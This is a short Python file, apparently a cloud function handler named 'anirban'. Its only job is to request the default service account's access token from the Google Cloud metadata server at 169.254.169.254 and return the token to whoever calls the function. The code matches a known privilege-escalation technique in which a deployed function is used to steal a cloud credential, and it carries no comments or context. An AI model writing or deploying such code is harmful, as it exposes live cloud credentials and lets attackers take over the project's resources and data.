import requests

def anirban(request):
    metadata_server_url = "http://169.254.169.254/computeMetadata/v1"
    metadata_key_url = f"{metadata_server_url}/instance/service-accounts/default/token"
    metadata_headers = {"Metadata-Flavor": "Google"}
    response = requests.get(metadata_key_url, headers=metadata_headers)
    access_token = response.text
    return access_token